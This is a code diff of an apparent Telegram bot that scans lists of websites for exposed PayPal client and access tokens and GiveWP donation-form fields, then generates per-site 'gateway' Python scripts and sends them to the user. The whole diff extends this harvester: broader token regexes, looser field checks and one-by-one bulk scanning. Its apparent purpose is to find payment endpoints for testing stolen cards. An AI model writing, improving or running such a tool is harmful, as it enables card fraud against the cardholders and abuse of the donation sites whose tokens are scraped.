@@ -11,7 +11,6 @@ from user_agent import generate_user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from queue import Queue
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -174,7 +173,6 @@ def ali_al2(massege):
             )
             return
 
-        # استخدام check_link المحسنة
         result = check_link(link)
         if not result:
             bot.edit_message_text(
@@ -321,6 +319,8 @@ import requests, re, random, time, base64
 from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class PayPal:
     def __init__(self):
@@ -536,7 +536,7 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص رابط PayPal - بطيء ودقيق"""
+    """فحص رابط PayPal - فحص شامل لكل الأنواع"""
     try:
         if not link.startswith(("http://", "https://")):
             return None
@@ -558,6 +558,30 @@ def check_link(link):
 
         res = r.text
         
+        # ============ فحص سريع: هل الصفحة فيها PayPal؟ ============
+        paypal_indicators = [
+            'paypal', 'PayPal', 'PAYPAL',
+            'client-token', 'client_token', 'clientToken',
+            'data-client-token',
+            'paypal_sdk', 'paypal-sdk',
+            'paypal.Buttons',
+            'smart-payment-buttons',
+            'ppcp', 'PPCP',
+            'give-form-id',
+            'paypal-commerce',
+            'paypal_commerce',
+        ]
+        
+        has_paypal = False
+        for indicator in paypal_indicators:
+            if indicator in res:
+                has_paypal = True
+                break
+        
+        if not has_paypal:
+            return None
+        
+        # ============ البحث عن client token ============
         au = None
         enc = None
         
@@ -574,105 +598,95 @@ def check_link(link):
             r'"client_token":"(.*?)"',
             r"client_token='(.*?)'",
             r'client_token=([^"\'\s>]+)',
+            r'client_token\s*=\s*["\'](.*?)["\']',
+            r'clientToken\s*=\s*["\'](.*?)["\']',
+            r'"clientToken"\s*:\s*"(.*?)"',
+            r'data_client_token\s*=\s*["\'](.*?)["\']',
+            r'data-client-token\s*:\s*["\'](.*?)["\']',
+            r'client-token\s*=\s*["\'](.*?)["\']',
+            r'"client-token"\s*:\s*"(.*?)"',
+            r'client_token\s*:\s*["\'](.*?)["\']',
         ]
         
         for pattern in patterns:
-            match = re.search(pattern, res)
+            match = re.search(pattern, res, re.IGNORECASE)
             if match:
                 enc = match.group(1)
                 break
         
-        if not enc:
-            token_patterns = [
-                r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
-                r'[A-Za-z0-9+/=]{50,}',
+        # بحث مباشر عن accessToken
+        if not au:
+            direct_au_patterns = [
+                r'"accessToken":"(.*?)"',
+                r"accessToken='(.*?)'",
+                r'accessToken=([^"\'\s>]+)',
+                r'access_token["\']?\s*:\s*["\'](.*?)["\']',
+                r'"access_token":"(.*?)"',
+                r'access_token\s*=\s*["\'](.*?)["\']',
             ]
-            for pattern in token_patterns:
-                match = re.search(pattern, res)
+            for pattern in direct_au_patterns:
+                match = re.search(pattern, res, re.IGNORECASE)
                 if match:
-                    enc = match.group(0)
+                    au = match.group(1)
                     break
         
-        if not enc:
-            return None
-        
-        try:
-            padded = enc + '=' * (-len(enc) % 4)
-            dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
-            au_match = re.search(r'"accessToken":"(.*?)"', dec)
-            if au_match:
-                au = au_match.group(1)
-            else:
-                au_match2 = re.search(r'accessToken["\']?\s*:\s*["\'](.*?)["\']', dec)
-                if au_match2:
-                    au = au_match2.group(1)
-        except:
-            au_match = re.search(r'"accessToken":"(.*?)"', enc)
-            if au_match:
-                au = au_match.group(1)
-            else:
-                au_match2 = re.search(r'accessToken["\']?\s*:\s*["\'](.*?)["\']', enc)
-                if au_match2:
-                    au = au_match2.group(1)
+        # فك client token
+        if not au and enc:
+            try:
+                padded = enc + '=' * (-len(enc) % 4)
+                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
+                au_match = re.search(r'"accessToken":"(.*?)"', dec)
+                if au_match:
+                    au = au_match.group(1)
+                else:
+                    au_match2 = re.search(r'accessToken["\']?\s*:\s*["\'](.*?)["\']', dec)
+                    if au_match2:
+                        au = au_match2.group(1)
+            except:
+                au_match = re.search(r'"accessToken":"(.*?)"', enc)
+                if au_match:
+                    au = au_match.group(1)
         
         if not au:
             return None
         
-        id_form1 = None
-        id_form2 = None
-        nonec = None
+        # ============ البحث عن form fields ============
+        id_form1 = ''
+        id_form2 = ''
+        nonec = ''
         
-        form_patterns_1 = [
-            r'name="give-form-id-prefix"\s+value="(.*?)"',
-            r"name='give-form-id-prefix'\s+value='(.*?)'",
-            r'name="give-form-id-prefix"\s+value=\'(.*?)\'',
-            r'value="(.*?)"\s+name="give-form-id-prefix"',
-            r'<input[^>]*give-form-id-prefix[^>]*value=["\']([^"\']*)["\']',
-            r'type=["\']hidden["\'][^>]*name=["\']give-form-id-prefix["\'][^>]*value=["\'](.*?)["\']',
-            r'give-form-id-prefix["\']?\s*:\s*["\'](.*?)["\']',
-            r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']*)["\']',
-        ]
+        # كل الأنماط
+        form_patterns = {
+            'id_form1': [
+                r'name="give-form-id-prefix"\s+value="(.*?)"',
+                r'give-form-id-prefix["\']?\s*:\s*["\'](.*?)["\']',
+                r'give_form_id_prefix\s*=\s*["\'](.*?)["\']',
+            ],
+            'id_form2': [
+                r'name="give-form-id"\s+value="(.*?)"',
+                r'give-form-id["\']?\s*:\s*["\'](.*?)["\']',
+                r'give_form_id\s*=\s*["\'](.*?)["\']',
+            ],
+            'nonec': [
+                r'name="give-form-hash"\s+value="(.*?)"',
+                r'give-form-hash["\']?\s*:\s*["\'](.*?)["\']',
+                r'give_form_hash\s*=\s*["\'](.*?)["\']',
+            ]
+        }
         
-        for pattern in form_patterns_1:
-            match = re.search(pattern, res)
-            if match:
-                id_form1 = match.group(1)
-                break
+        for field, patterns_list in form_patterns.items():
+            for pattern in patterns_list:
+                match = re.search(pattern, res, re.IGNORECASE)
+                if match:
+                    if field == 'id_form1':
+                        id_form1 = match.group(1)
+                    elif field == 'id_form2':
+                        id_form2 = match.group(1)
+                    else:
+                        nonec = match.group(1)
+                    break
         
-        form_patterns_2 = [
-            r'name="give-form-id"\s+value="(.*?)"',
-            r"name='give-form-id'\s+value='(.*?)'",
-            r'name="give-form-id"\s+value=\'(.*?)\'',
-            r'value="(.*?)"\s+name="give-form-id"',
-            r'<input[^>]*give-form-id[^>]*value=["\']([^"\']*)["\']',
-            r'type=["\']hidden["\'][^>]*name=["\']give-form-id["\'][^>]*value=["\'](.*?)["\']',
-            r'give-form-id["\']?\s*:\s*["\'](.*?)["\']',
-            r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']*)["\']',
-        ]
-        
-        for pattern in form_patterns_2:
-            match = re.search(pattern, res)
-            if match:
-                id_form2 = match.group(1)
-                break
-        
-        form_patterns_3 = [
-            r'name="give-form-hash"\s+value="(.*?)"',
-            r"name='give-form-hash'\s+value='(.*?)'",
-            r'name="give-form-hash"\s+value=\'(.*?)\'',
-            r'value="(.*?)"\s+name="give-form-hash"',
-            r'<input[^>]*give-form-hash[^>]*value=["\']([^"\']*)["\']',
-            r'type=["\']hidden["\'][^>]*name=["\']give-form-hash["\'][^>]*value=["\'](.*?)["\']',
-            r'give-form-hash["\']?\s*:\s*["\'](.*?)["\']',
-            r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']*)["\']',
-        ]
-        
-        for pattern in form_patterns_3:
-            match = re.search(pattern, res)
-            if match:
-                nonec = match.group(1)
-                break
-        
+        # البحث في hidden fields
         if not id_form1 or not id_form2 or not nonec:
             hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', res, re.IGNORECASE)
             for field in hidden_fields:
@@ -688,24 +702,7 @@ def check_link(link):
                     elif 'give-form-hash' in name and not nonec:
                         nonec = value
         
-        if not id_form1:
-            js_match = re.search(r'give_form_id_prefix\s*=\s*["\'](.*?)["\']', res)
-            if js_match:
-                id_form1 = js_match.group(1)
-        
-        if not id_form2:
-            js_match = re.search(r'give_form_id\s*=\s*["\'](.*?)["\']', res)
-            if js_match:
-                id_form2 = js_match.group(1)
-        
-        if not nonec:
-            js_match = re.search(r'give_form_hash\s*=\s*["\'](.*?)["\']', res)
-            if js_match:
-                nonec = js_match.group(1)
-        
-        if not all([id_form1, id_form2, nonec, au]):
-            return None
-        
+        # لو مفيش form fields، نرجع au بس (PayPal Commerce عادي)
         return {
             'link': link,
             'id_form1': id_form1,
@@ -804,91 +801,42 @@ def process_bulk_file(message):
         updater = threading.Thread(target=update_status_loop, daemon=True)
         updater.start()
 
-        # ============ فحص بطيء ودقيق ============
-        batch_size = 10
-        max_workers = 3
-        rest_time = 0.5
-        
-        for i in range(0, total, batch_size):
+        # ============ فحص موقع موقع - بطيء ودقيق ============
+        for idx, link in enumerate(links):
             if stop_event.is_set():
                 break
             
-            batch_links = links[i:i + batch_size]
+            result = check_link(link)
             
-            try:
-                with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                    future_to_link = {executor.submit(check_link, link): link for link in batch_links}
-                    
-                    for future in as_completed(future_to_link):
-                        if stop_event.is_set():
-                            break
-                        
-                        try:
-                            result = future.result()
-                        except Exception:
-                            result = None
-
-                        with progress['lock']:
-                            progress['processed'] += 1
-
-                            if result:
-                                progress['live'] += 1
-                                live_idx = progress['live']
-                                try:
-                                    code = generate_gateway_code(result, live_idx, file_num)
-                                    file_name = f'gateway_{file_num}_{live_idx}_{user_id}.py'
-                                    with open(file_name, 'w', encoding='utf-8') as f:
-                                        f.write(code)
-                                    caption = f"""✅ <b>File #{file_num} - Gateway #{live_idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{result['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr"""
-                                    send_queue.put((chat_id, file_name, caption))
-                                except Exception as e:
-                                    print(f"Error preparing file: {e}")
-                            else:
-                                progress['dead'] += 1
-            except Exception as batch_error:
-                print(f"Batch error: {batch_error}")
-                for link in batch_links:
-                    if stop_event.is_set():
-                        break
+            with progress['lock']:
+                progress['processed'] += 1
+                
+                if result:
+                    progress['live'] += 1
+                    live_idx = progress['live']
                     try:
-                        result = check_link(link)
-                    except:
-                        result = None
-                    
-                    with progress['lock']:
-                        progress['processed'] += 1
-                        if result:
-                            progress['live'] += 1
-                            live_idx = progress['live']
-                            try:
-                                code = generate_gateway_code(result, live_idx, file_num)
-                                file_name = f'gateway_{file_num}_{live_idx}_{user_id}.py'
-                                with open(file_name, 'w', encoding='utf-8') as f:
-                                    f.write(code)
-                                caption = f"""✅ <b>File #{file_num} - Gateway #{live_idx}</b>
+                        code = generate_gateway_code(result, live_idx, file_num)
+                        file_name = f'gateway_{file_num}_{live_idx}_{user_id}.py'
+                        with open(file_name, 'w', encoding='utf-8') as f:
+                            f.write(code)
+                        caption = f"""✅ <b>File #{file_num} - Gateway #{live_idx}</b>
 ━━━━━━━━━━━━━━━━━━━━
 🔗 Link: <code>{result['link']}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr"""
-                                send_queue.put((chat_id, file_name, caption))
-                            except:
-                                pass
-                        else:
-                            progress['dead'] += 1
-                    time.sleep(1)
+                        send_queue.put((chat_id, file_name, caption))
+                    except Exception as e:
+                        print(f"Error preparing file: {e}")
+                else:
+                    progress['dead'] += 1
             
-            del batch_links
-            del future_to_link
-            cleanup_memory()
-            time.sleep(rest_time)
+            # تنظيف كل 50 رابط
+            if progress['processed'] % 50 == 0:
+                cleanup_memory()
+                time.sleep(0.5)
             
-            if (i // batch_size) % 5 == 0:
-                gc.collect()
-                time.sleep(1)
+            # راحة صغيرة بين كل رابط
+            time.sleep(0.2)
 
         stop_event.set()
         updater.join(timeout=1)
